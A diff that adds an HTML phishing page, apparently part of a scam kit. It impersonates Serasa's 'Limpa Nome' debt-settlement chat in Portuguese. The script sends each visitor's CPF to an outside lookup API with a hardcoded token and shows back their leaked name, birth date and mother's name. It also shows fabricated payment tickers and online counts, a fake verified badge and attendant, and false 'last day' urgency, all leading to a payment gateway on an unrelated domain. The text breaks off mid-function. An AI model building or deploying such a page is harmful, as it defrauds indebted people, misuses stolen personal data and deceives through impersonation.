@@ -1,0 +1,1257 @@
+<html lang="pt-BR" style="--vh: 10.8px;">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Atendimento</title>
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-18121057741"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+        gtag('config', 'AW-18121057741');
+    </script>
+
+    <!-- Meta Pixel Code (Facebook Ads) -->
+    <script>
+        !function(f,b,e,v,n,t,s)
+        {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+        n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+        if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+        n.queue=[];t=b.createElement(e);t.async=!0;
+        t.src=v;s=b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t,s)}(window, document,'script',
+        'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '1793193341234155');
+        fbq('track', 'PageView');
+    </script>
+    <noscript>
+        <img height="1" width="1" style="display:none"
+            src="https://www.facebook.com/tr?id=1793193341234155&ev=PageView&noscript=1"/>
+    </noscript>
+    <!-- End Meta Pixel Code -->
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body,
+        html {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            height: 100%;
+            width: 100%;
+            background: #f0f0f0;
+        }
+
+        :root {
+            --rosa-serasa: #e10075;
+            --azul-seguro: #2d3277;
+            --bg-chat: #e5ddd5;
+            --msg-left: #ffffff;
+            --msg-right: #dcf8c6;
+            --vh: 1vh;
+        }
+
+        .chat-wrapper {
+            width: 100%;
+            height: 100vh;
+            height: calc(var(--vh, 1vh) * 100);
+            display: flex;
+            flex-direction: column;
+            background: var(--bg-chat);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .chat-header {
+            background: var(--rosa-serasa);
+            color: white;
+            display: flex;
+            align-items: center;
+            padding: 8px 12px;
+            gap: 10px;
+            z-index: 1000;
+            flex-shrink: 0;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+            position: relative;
+        }
+
+        .header-logo {
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            object-fit: contain;
+            background: white;
+            padding: 2px;
+            display: block !important;
+        }
+
+        .chat-header .back-arrow {
+            font-size: 20px;
+            cursor: pointer;
+        }
+
+        .chat-header .header-info {
+            flex: 1;
+        }
+
+        .chat-header .header-name {
+            font-weight: bold;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .chat-header .verified-badge {
+            width: 16px;
+            height: 16px;
+            background: #4fc3f7;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            color: white;
+        }
+
+        .chat-header .header-status {
+            font-size: 12px;
+            opacity: 0.9;
+        }
+
+        .card-acordo {
+            background: rgba(255, 255, 255, 0.15);
+            padding: 4px 8px;
+            border-radius: 20px;
+            font-size: 10px;
+            color: white;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            max-width: 140px;
+            display: none;
+            align-items: center;
+            gap: 4px;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            margin-left: auto;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .card-acordo.show {
+            display: flex;
+        }
+
+        .chat-body {
+            flex: 1;
+            overflow-y: auto;
+            padding: 10px;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            scroll-behavior: smooth;
+            -webkit-overflow-scrolling: touch;
+            padding-bottom: 20px;
+        }
+
+        .msg-row {
+            display: flex;
+            align-items: flex-end;
+            gap: 8px;
+            max-width: 85%;
+            opacity: 0;
+            transform: translateY(15px);
+            animation: msgIn 0.4s ease forwards;
+            margin-bottom: 4px;
+        }
+
+        .msg-row.left {
+            align-self: flex-start;
+        }
+
+        .msg-row.right {
+            align-self: flex-end;
+            flex-direction: row-reverse;
+        }
+
+        .msg-bubble {
+            padding: 8px 12px;
+            border-radius: 12px;
+            font-size: 14px;
+            line-height: 1.4;
+            position: relative;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            display: inline-block;
+            word-wrap: break-word;
+        }
+
+        .msg-row.left .msg-bubble {
+            background: var(--msg-left);
+            border-bottom-left-radius: 4px;
+            color: #333;
+        }
+
+        .msg-row.right .msg-bubble {
+            background: var(--msg-right);
+            border-bottom-right-radius: 4px;
+            color: #333;
+        }
+
+        .msg-time {
+            font-size: 10px;
+            color: #999;
+            margin-left: 8px;
+            float: right;
+            margin-top: 4px;
+        }
+
+        .typing-indicator {
+            display: flex;
+            align-items: flex-end;
+            gap: 8px;
+            max-width: 85%;
+            align-self: flex-start;
+            margin-bottom: 10px;
+        }
+
+        .typing-dots {
+            background: var(--msg-left);
+            padding: 8px 12px;
+            border-radius: 12px;
+            border-bottom-left-radius: 4px;
+            display: flex;
+            gap: 4px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+
+        .typing-dots span {
+            width: 8px;
+            height: 8px;
+            background: #999;
+            border-radius: 50%;
+            animation: typingBounce 1.4s infinite;
+        }
+
+        .typing-dots span:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .typing-dots span:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        .audio-msg {
+            background: var(--msg-left);
+            border-radius: 12px;
+            border-bottom-left-radius: 4px;
+            padding: 8px 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            min-width: 240px;
+            max-width: 100%;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+
+        .audio-play-btn {
+            width: 36px;
+            height: 36px;
+            background: var(--rosa-serasa);
+            border: none;
+            border-radius: 50%;
+            color: white;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .audio-wave {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            gap: 2px;
+            height: 30px;
+        }
+
+        .audio-wave .bar {
+            width: 3px;
+            background: var(--rosa-serasa);
+            border-radius: 2px;
+            opacity: 0.5;
+        }
+
+        .audio-wave .bar.active {
+            opacity: 1;
+        }
+
+        .audio-time {
+            font-size: 11px;
+            color: #888;
+            white-space: nowrap;
+        }
+
+        .audio-avatar-small {
+            width: 34px;
+            height: 34px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+
+        .msg-image {
+            max-width: 280px;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+
+        .msg-image img {
+            width: 100%;
+            display: block;
+        }
+
+        .card-aprovado {
+            background: white;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.12);
+            max-width: 320px;
+        }
+
+        .card-aprovado img {
+            width: 100%;
+            display: block;
+        }
+
+        .card-dados {
+            background: white;
+            border-radius: 12px;
+            padding: 16px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            max-width: 320px;
+        }
+
+        .card-dados .dado-row {
+            border: 1px solid #eee;
+            border-radius: 8px;
+            padding: 10px 14px;
+            margin-bottom: 8px;
+        }
+
+        .card-dados .dado-label {
+            font-size: 11px;
+            color: #999;
+        }
+
+        .card-dados .dado-value {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .card-dados .score-bar {
+            height: 4px;
+            background: linear-gradient(to right, #ff4444, #ff9800, #4caf50);
+            border-radius: 2px;
+            margin-top: 8px;
+        }
+
+        .btn-option {
+            display: inline-block;
+            padding: 12px 24px;
+            border-radius: 25px;
+            border: none;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 0;
+        }
+
+        .btn-primary {
+            background: var(--rosa-serasa);
+            color: white;
+            box-shadow: 0 4px 12px rgba(225, 0, 117, 0.3);
+        }
+
+        .btn-primary:hover {
+            background: #c90068;
+            transform: translateY(-1px);
+        }
+
+        .btn-secondary {
+            background: white;
+            color: #666;
+            border: 1px solid #ddd;
+        }
+
+        .btn-secondary:hover {
+            background: #f5f5f5;
+        }
+
+        .btn-large {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            font-size: 16px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-container {
+            display: flex;
+            flex-direction: column;
+            gap: 0px;
+            align-items: flex-end;
+            max-width: 85%;
+            align-self: flex-end;
+        }
+
+        .chat-input-area {
+            background: white;
+            padding: 10px 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-top: 1px solid #eee;
+            flex-shrink: 0;
+            z-index: 1001;
+            padding-bottom: calc(10px + env(safe-area-inset-bottom));
+        }
+
+        .chat-input-area input {
+            flex: 1;
+            border: 2px dashed var(--rosa-serasa);
+            border-radius: 25px;
+            padding: 12px 18px;
+            font-size: 16px;
+            outline: none;
+            background: #fff;
+        }
+
+        .chat-input-area input:focus {
+            border-style: solid;
+        }
+
+        .chat-input-area button {
+            background: var(--rosa-serasa);
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 44px;
+            height: 44px;
+            font-size: 18px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .notif-feirao {
+            position: fixed;
+            top: -100px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: var(--rosa-serasa);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 50px;
+            font-weight: bold;
+            font-size: 12px;
+            z-index: 2000;
+            box-shadow: 0 10px 25px rgba(225, 0, 117, 0.4);
+            white-space: nowrap;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: top 0.6s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+        }
+
+        .notif-feirao.show {
+            top: 60px;
+        }
+
+        .notif-oficial {
+            position: fixed;
+            top: 110px;
+            left: -350px;
+            background: #ffffff;
+            border: 1px solid #ddd;
+            padding: 6px 12px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            z-index: 1999;
+            transition: left 0.5s ease-out;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .notif-oficial.show {
+            left: 10px;
+        }
+
+        .selo-verificado {
+            background: #00c853;
+            color: white;
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 9px;
+            font-weight: bold;
+        }
+
+        .notif-online {
+            position: fixed;
+            top: 65px;
+            right: -350px;
+            background: rgba(255, 255, 255, 0.95);
+            border: 2px solid var(--rosa-serasa);
+            padding: 6px 12px;
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            z-index: 1998;
+            transition: right 0.5s ease-out;
+        }
+
+        .notif-online.show {
+            right: 10px;
+        }
+
+        .welcome-card {
+            background: var(--rosa-serasa);
+            border-radius: 16px;
+            padding: 20px;
+            text-align: center;
+            color: white;
+            max-width: 300px;
+            margin-bottom: 10px;
+        }
+
+        .welcome-card .welcome-photos img {
+            width: 100%;
+            max-width: 260px;
+            border-radius: 12px;
+            margin-bottom: 12px;
+        }
+
+        .welcome-card h3 {
+            font-size: 18px;
+            margin-bottom: 6px;
+        }
+
+        .welcome-card p {
+            font-size: 13px;
+            opacity: 0.9;
+        }
+
+        .welcome-card .online-dot {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            margin-top: 8px;
+            font-size: 12px;
+        }
+
+        .ponto-vivo {
+            width: 8px;
+            height: 8px;
+            background: #00c853;
+            border-radius: 50%;
+            animation: blink 1s infinite;
+        }
+
+        .score-img-container {
+            background: white;
+            border-radius: 12px;
+            padding: 10px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            max-width: 300px;
+        }
+
+        .score-img-container img {
+            width: 100%;
+            display: block;
+        }
+
+        .acordo-card {
+            background: white;
+            border-radius: 12px;
+            padding: 16px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            max-width: 320px;
+            border-left: 4px solid var(--rosa-serasa);
+        }
+
+        .acordo-card .acordo-header {
+            font-size: 12px;
+            color: #999;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 8px;
+            margin-bottom: 10px;
+        }
+
+        .acordo-card .acordo-num {
+            font-weight: bold;
+            color: var(--rosa-serasa);
+            font-size: 14px;
+        }
+
+        @media (max-width: 480px) {
+            .notif-feirao {
+                width: 90%;
+                white-space: normal;
+                text-align: center;
+                justify-content: center;
+                font-size: 11px;
+            }
+
+            .notif-feirao.show {
+                top: 55px;
+            }
+
+            .notif-oficial {
+                top: 105px;
+                font-size: 11px;
+            }
+
+            .notif-online {
+                top: 55px;
+                font-size: 11px;
+            }
+
+            .msg-row {
+                max-width: 92%;
+            }
+
+            .chat-body {
+                padding: 10px;
+            }
+        }
+
+        @keyframes msgIn {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes typingBounce {
+
+            0%,
+            60%,
+            100% {
+                transform: translateY(0);
+            }
+
+            30% {
+                transform: translateY(-6px);
+            }
+        }
+
+        @keyframes blink {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.3;
+            }
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-5px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="notifOficial" class="notif-oficial">
+        <div class="selo-verificado">✓</div>
+        <div style="font-size: 12px; color: #444;">Página Oficial <strong
+                style="color: var(--azul-seguro);">Serasa</strong></div>
+    </div>
+    <div id="notifFeirao" class="notif-feirao">
+        <span>⏳</span> O FEIRÃO LIMPA NOME ACABA HOJE!
+    </div>
+    <div id="notifOnline" class="notif-online show">
+        <div class="ponto-vivo"></div>
+        <span id="txtOnline" style="font-size: 13px; color: #333;"><strong>138</strong> pessoas online.</span>
+    </div>
+
+    <div class="chat-wrapper">
+        <div class="chat-header">
+            <span class="back-arrow">←</span>
+            <img src="images/Q8FJx6h7cqrD.png" class="header-logo" alt="Logo">
+            <div class="header-info">
+                <div class="header-name">Serasa <span class="verified-badge">✓</span></div>
+                <div class="header-status">Online</div>
+            </div>
+            <div id="cardAcordo" class="card-acordo show">
+                <span style="color: #4caf50;">●</span>
+                <div id="txtAcordo">Sandra quitou por R$ 373,61</div>
+            </div>
+        </div>
+
+        <div class="chat-body" id="chatBody">
+            <div class="msg-row left">
+                <div style="width:100%">
+                    <div class="welcome-card">
+                        <div class="welcome-photos">
+                            <img src="images/Design-sem-nome.webp" alt="Equipe Serasa"
+                                onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 400 200\'%3E%3Crect width=\'400\' height=\'200\' fill=\'%23e10075\'/%3E%3Ctext x=\'200\' y=\'110\' font-size=\'24\' text-anchor=\'middle\' fill=\'white\' font-weight=\'bold\'%3EEquipe Serasa%3C/text%3E%3C/svg%3E'"
+                                style="width:100%; max-width:260px; border-radius:12px; margin-bottom:12px; display:block !important;">
+                        </div>
+                        <h3>Dúvidas? Fale Conosco</h3>
+                        <p>Costuma responder em até 10 minutos</p>
+                        <div class="online-dot">
+                            <div class="ponto-vivo"></div> Online agora
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="typing-indicator" id="typingIndicator">
+                <div class="typing-dots">
+                    <span></span><span></span><span></span>
+                </div>
+            </div>
+        </div>
+
+        <div class="chat-input-area" id="inputArea">
+            <input type="text" id="cpfInput" placeholder="Digite seu CPF" maxlength="14" inputmode="numeric">
+            <button id="sendBtn">➤</button>
+        </div>
+    </div>
+
+    <audio id="notificationSound" preload="auto"
+        src="data:audio/wav;base64,UklGRiYAAABXQVZFZm10IBAAAAABAAEAQB8AAAB9AAACABAAZGF0YQIAAAAAAA=="></audio>
+
+    <script>
+        function updateVH() {
+            let vh = window.innerHeight * 0.01;
+            document.documentElement.style.setProperty('--vh', `${vh}px`);
+        }
+        window.addEventListener('resize', updateVH);
+        window.addEventListener('orientationchange', updateVH);
+        updateVH();
+
+        document.body.addEventListener('touchmove', function (e) {
+            if (!e.target.closest('#chatBody')) {
+                e.preventDefault();
+            }
+        }, { passive: false });
+    </script>
+
+    <script>
+        // ===== CONFIGURAÇÕES =====
+        const CONFIG = {
+            apiUrl: 'https://cpf.zealpriv8.lat/api/cpf',
+            apiToken: 'MtQHMyXrsqMlWoVQBz6DyOD4wSZ0oieql6nXIokN',
+            gateway: 'https://clkdmg.site/pay/99-de-desconto-acordo',
+            valor: '78,56',
+            desconto: '99',
+            score: '890'
+        };
+
+        // ===== ELEMENTOS =====
+        const chatBody = document.getElementById('chatBody');
+        const cpfInput = document.getElementById('cpfInput');
+        const inputArea = document.getElementById('inputArea');
+        let userData = null;
+        let acordoNum = '';
+
+        const nomes = ["Ricardo", "Ana", "Marcelo", "Beatriz", "Felipe", "Juliana", "Marcos", "Patrícia", "Sandra", "Lucas"];
+
+        // ===== HELPERS =====
+        function getTime() {
+            const now = new Date();
+            return `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}`;
+        }
+
+        function scrollToBottom() {
+            setTimeout(() => chatBody.scrollTop = chatBody.scrollHeight, 100);
+        }
+
+        function delay(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        function gerarAcordoNum() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let r = '';
+            for (let i = 0; i < 12; i++) r += chars[Math.floor(Math.random() * chars.length)];
+            return r.slice(0, 3) + '-' + r.slice(3, 7) + '-' + r.slice(7, 11) + 'E';
+        }
+
+        // ===== TYPING =====
+        function showTyping() {
+            const existing = document.getElementById('typingIndicator');
+            if (existing && existing.id === 'typingIndicator') existing.remove();
+            const div = document.createElement('div');
+            div.className = 'typing-indicator';
+            div.id = 'typingIndicator';
+            div.innerHTML = `<div class="typing-dots"><span></span><span></span><span></span></div>`;
+            chatBody.appendChild(div);
+            scrollToBottom();
+        }
+
+        function hideTyping() {
+            const el = document.getElementById('typingIndicator');
+            if (el) el.remove();
+        }
+
+        // ===== MENSAGENS =====
+        function addMessage(side, content, isHTML = false) {
+            hideTyping();
+            const row = document.createElement('div');
+            row.className = `msg-row ${side}`;
+            if (isHTML) {
+                row.innerHTML = `<div>${content}</div>`;
+            } else {
+                row.innerHTML = `<div class="msg-bubble"><span class="msg-content">${content}</span><span class="msg-time">${getTime()}</span></div>`;
+            }
+            chatBody.appendChild(row);
+            scrollToBottom();
+        }
+
+        function addButtons(buttons) {
+            const container = document.createElement('div');
+            container.className = 'btn-container';
+            buttons.forEach(btn => {
+                const b = document.createElement('button');
+                b.className = `btn-option ${btn.class || 'btn-primary'}`;
+                if (btn.large) b.classList.add('btn-large');
+                b.textContent = btn.text;
+                b.onclick = () => {
+                    addMessage('right', btn.text);
+                    container.remove();
+                    if (btn.action) btn.action();
+                };
+                container.appendChild(b);
+            });
+            chatBody.appendChild(container);
+            scrollToBottom();
+        }
+
+        function addCard(html) {
+            hideTyping();
+            const row = document.createElement('div');
+            row.className = 'msg-row left';
+            row.innerHTML = `<div style="width:100%">${html}</div>`;
+            chatBody.appendChild(row);
+            scrollToBottom();
+        }
+
+        // ===== VÍDEO =====
+        function addVideo(videoSrc, titulo = '') {
+            hideTyping();
+            const row = document.createElement('div');
+            row.className = 'msg-row left';
+            row.innerHTML = `
+                <div style="max-width:280px; border-radius:12px; overflow:hidden; background:#000;">
+                    ${titulo ? `<div style="background:var(--rosa-serasa); color:white; padding:6px 10px; font-size:11px; text-align:center;">${titulo}</div>` : ''}
+                    <video controls style="width:100%; display:block;" preload="metadata">
+                        <source src="${videoSrc}" type="video/mp4">
+                    </video>
+                </div>
+            `;
+            chatBody.appendChild(row);
+            scrollToBottom();
+        }
+
+        // ===== ÁUDIO =====
+        function addAudio(audioSrc, onEndCallback = null) {
+            hideTyping();
+            const row = document.createElement('div');
+            row.className = 'msg-row left';
+            
+            const bars = [];
+            for (let i = 0; i < 25; i++) {
+                bars.push(`<div class="bar" style="height:${Math.floor(Math.random() * 20 + 5)}px"></div>`);
+            }
+            
+            const audioId = 'audio_' + Date.now();
+            row.innerHTML = `
+                <div class="audio-msg">
+                    <button class="audio-play-btn" id="${audioId}_btn">▶</button>
+                    <div style="flex:1">
+                        <div class="audio-wave">${bars.join('')}</div>
+                        <div class="audio-time"><span id="${audioId}_time">0:00</span> / <span id="${audioId}_dur">---</span></div>
+                    </div>
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='45' fill='%23e10075'/%3E%3Ctext x='50' y='67' font-size='40' text-anchor='middle' fill='white'%3EF%3C/text%3E%3C/svg%3E" style="width:34px; height:34px; border-radius:50%;">
+                    <audio id="${audioId}" preload="auto"></audio>
+                </div>
+            `;
+            chatBody.appendChild(row);
+            scrollToBottom();
+
+            const audio = document.getElementById(audioId);
+            const durSpan = document.getElementById(`${audioId}_dur`);
+            const timeSpan = document.getElementById(`${audioId}_time`);
+            const playBtn = document.getElementById(`${audioId}_btn`);
+
+            audio.addEventListener('loadedmetadata', () => {
+                const mins = Math.floor(audio.duration / 60);
+                const secs = Math.floor(audio.duration % 60);
+                durSpan.textContent = `${mins}:${secs.toString().padStart(2, '0')}`;
+            });
+            
+            audio.addEventListener('timeupdate', () => {
+                const mins = Math.floor(audio.currentTime / 60);
+                const secs = Math.floor(audio.currentTime % 60);
+                timeSpan.textContent = `${mins}:${secs.toString().padStart(2, '0')}`;
+                const pct = audio.currentTime / (audio.duration || 1);
+                row.querySelectorAll('.bar').forEach((b, i) => {
+                    b.classList.toggle('active', i / 25 < pct);
+                });
+            });
+            
+            audio.addEventListener('ended', () => {
+                playBtn.textContent = '▶';
+                row.querySelectorAll('.bar').forEach(b => b.classList.remove('active'));
+                timeSpan.textContent = '0:00';
+                if (onEndCallback) onEndCallback();
+            });
+            
+            playBtn.onclick = () => {
+                if (audio.paused) {
+                    audio.play().then(() => playBtn.textContent = '❚❚').catch(e => console.log('Erro:', e));
+                } else {
+                    audio.pause();
+                    playBtn.textContent = '▶';
+                }
+            };
+            
+            audio.src = audioSrc;
+            audio.load();
+        }
+
+        // ===== API CPF =====
+        async function consultarCPF(cpf) {
+            const cpfClean = cpf.replace(/\D/g, '');
+            try {
+                const res = await fetch(`${CONFIG.apiUrl}?token=${CONFIG.apiToken}&cpf=${cpfClean}`);
+                if (!res.ok) throw new Error('CPF não encontrado');
+                const data = await res.json();
+                return {
+                    CPF: data.data.cpf,
+                    NOME: data.data.nome,
+                    NASC: data.data.nascimento,
+                    NOME_MAE: data.data.mae
+                };
+            } catch (error) {
+                console.error('Erro API:', error);
+                throw error;
+            }
+        }
+
+        // ===== NOTIFICAÇÕES =====
+        function playNotificationSound() {
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                if (ctx.state === 'suspended') ctx.resume();
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                osc.frequency.value = 800;
+                gain.gain.setValueAtTime(0.3, ctx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);
+                osc.start();
+                osc.stop(ctx.currentTime + 0.3);
+            } catch(e) {}
+        }
+
+        function showAttendantNotification() {
+            const notif = document.createElement('div');
+            notif.style.cssText = 'position:fixed;top:60px;left:50%;transform:translateX(-50%);background:linear-gradient(135deg,#e10075,#c90068);color:white;padding:12px 24px;border-radius:20px;font-weight:bold;z-index:2000;animation:slideDown 0.4s ease,slideUp 0.4s ease 3.6s forwards';
+            notif.textContent = 'Atendente Fernanda entrou na conversa';
+            document.body.appendChild(notif);
+            setTimeout(() => notif.remove(), 4000);
+        }
+
+        function initNotificacoes() {
+            setInterval(() => {
+                const oficial = document.getElementById('notifOficial');
+                const feirao = document.getElementById('notifFeirao');
+                if (oficial && feirao) {
+                    oficial.classList.add('show');
+                    setTimeout(() => oficial.classList.remove('show'), 6000);
+                    setTimeout(() => {
+                        feirao.classList.add('show');
+                        setTimeout(() => feirao.classList.remove('show'), 8000);
+                    }, 5000);
+                }
+            }, 180000);
+            
+            const cicloOnline = () => {
+                const el = document.getElementById('notifOnline');
+                const txt = document.getElementById('txtOnline');
+                if (el && txt) {
+                    txt.innerHTML = Math.random() > 0.5 ? `<strong>${Math.floor(Math.random() * 50 + 120)}</strong> pessoas online` : `<strong>${Math.floor(Math.random() * 10 + 5)}</strong> entraram agora`;
+                    el.classList.add('show');
+                    setTimeout(() => el.classList.remove('show'), 6000);
+                    setTimeout(cicloOnline, Math.random() * 10000 + 20000);
+                }
+            };
+            
+            const cicloAcordos = () => {
+                const el = document.getElementById('cardAcordo');
+                const txt = document.getElementById('txtAcordo');
+                if (el && txt) {
+                    const nome = nomes[Math.floor(Math.random() * nomes.length)];
+                    const rand = Math.random();
+                    if (rand < 0.33) txt.innerHTML = `${nome} finalizando acordo...`;
+                    else if (rand < 0.66) txt.innerHTML = `${nome} quitou por R$ ${(Math.random() * 18 + 81).toFixed(2).replace('.', ',')}`;
+                    else txt.innerHTML = `${nome} quitou por R$ ${(Math.random() * 80 + 370).toFixed(2).replace('.', ',')}`;
+                    el.classList.add('show');
+                    setTimeout(() => el.classList.remove('show'), 5000);
+                    setTimeout(cicloAcordos, Math.random() * 10000 + 12000);
+                }
+            };
+            cicloOnline();
+            cicloAcordos();
+        }
+
+        // ===== MÁSCARA CPF =====
+        if (cpfInput) {
+            cpfInput.addEventListener('input', function(e) {
+                let v = e.target.value.replace(/\D/g, '');
+                if (v.length > 11) v = v.slice(0, 11);
+                if (v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+                else if (v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
+                else if (v.length > 3) v = v.replace(/(\d{3})(\d{1,3})/, '$1.$2');
+                e.target.value = v;
+            });
+            cpfInput.addEventListener('keypress', e => { if (e.key === 'Enter') enviarCPF(); });
+        }
+
+        const sendBtn = document.getElementById('sendBtn');
+        if (sendBtn) sendBtn.onclick = enviarCPF;
+
+        // ===== FUNIL =====
+        async function iniciarFunil() {
+            console.log('Funil iniciado');
+            await delay(2000);
+            addMessage('left', 'Bem-vindo! Para encontrar uma proposta, informe seu CPF para verificação. 🔍');
+        }
+
+        async function enviarCPF() {
+            const cpf = cpfInput.value.trim();
+            if (cpf.replace(/\D/g, '').length !== 11) {
+                alert('Digite um CPF válido com 11 dígitos.');
+                return;
+            }
+            
+            addMessage('right', cpf);
+            inputArea.classList.add('hidden');
+            showTyping();
+            await delay(3000);
+            
+            try {
+                userData = await consultarCPF(cpf);
+                console.log('Dados:', userData);
+            } catch(e) {
+                hideTyping();
+                addMessage('left', '❌ CPF não encontrado. Verifique e tente novamente.');
+                inputArea.classList.remove('hidden');
+                return;
+            }
+            
+            hideTyping();
+            acordoNum = gerarAcordoNum();
+            
+            addMessage('left', `Olá, <strong>${userData.NOME}</strong>.<br>Bem-vindo ao atendimento oficial Serasa Limpa Nome. Seus dados estão protegidos e seguros conosco. 🔐<br>Um de nossos atendentes entrará em breve para te auxiliar.`);
+            await delay(2000);
+            
+            playNotificationSound();
+            showAttendantNotification();
+            addMessage('left', '<strong>Atendente Fernanda</strong> entrou na conversa!');
+            await delay(1500);
+            
+            addVideo('video/saudacao.mp4', '📹 Atendente Fernanda');
+            await delay(500);
+            addAudio('audio/1audio.mp3');
+            await delay(500);
+            
+            addButtons([{ text: 'CONTINUAR', class: 'btn-primary btn-large', large: true, action: etapaConfirmacaoDados }]);
+        }
+
+        async function etapaConfirmacaoDados() {
+            showTyping();
+            await delay(2000);
+            addMessage('left', 'Por gentileza, confirme se os dados abaixo estão corretos:');
+            await delay(1500);
+            addCard(`
+                <div class="card-dados">
+                    <div class="dado-row"><div class="dado-label">Nome completo:</div><div class="dado-value">${userData.NOME}</div></div>
+                    <div class="dado-row"><div class="dado-label">Data de nascimento:</div><div class="dado-value">${userData.NASC}</div></div>
+                    <div class="dado-row"><div class="dado-label">Nome da mãe:</div><div class="dado-value">${userData.NOME_MAE}</div></div>
+                </div>
+            `);
+            await delay(2000);
+            addButtons([{ text: 'Sim, está correto', class: 'btn-primary', action: etapaAcessoAprovado }]);
+        }
+
+        async function etapaAcessoAprovado() {
+            showTyping();
+            await delay(2000);
+            addMessage('left', '✅ Verificação concluída com sucesso!');
+            await delay(1500);
+            
+            addVideo('video/provasocial.mp4', '📹 Depoimentos reais');
+            await delay(2000);
+            
+            addMessage('left', `Este é o maior Feirão Limpa Nome de 2026. Em parceria com o programa <strong>Desenrola Brasil</strong>, oferecemos até <strong>${CONFIG.desconto}% de desconto</strong> para quitar suas dívidas. São mais de 400 empresas participantes.`);
+            await delay(2000);
+            addMessage('left', `Você deseja aproveitar o <strong>último dia do Feirão</strong>?`);
+            await delay(1500);
+            addButtons([{ text: 'SIM, QUERO NEGOCIAR', class: 'btn-primary btn-large', large: true, action: etapaAnaliseSituacao }]);
+        }
+
+        async function etapaAnaliseSituacao() {
+            showTyping();
+            await delay(2000);
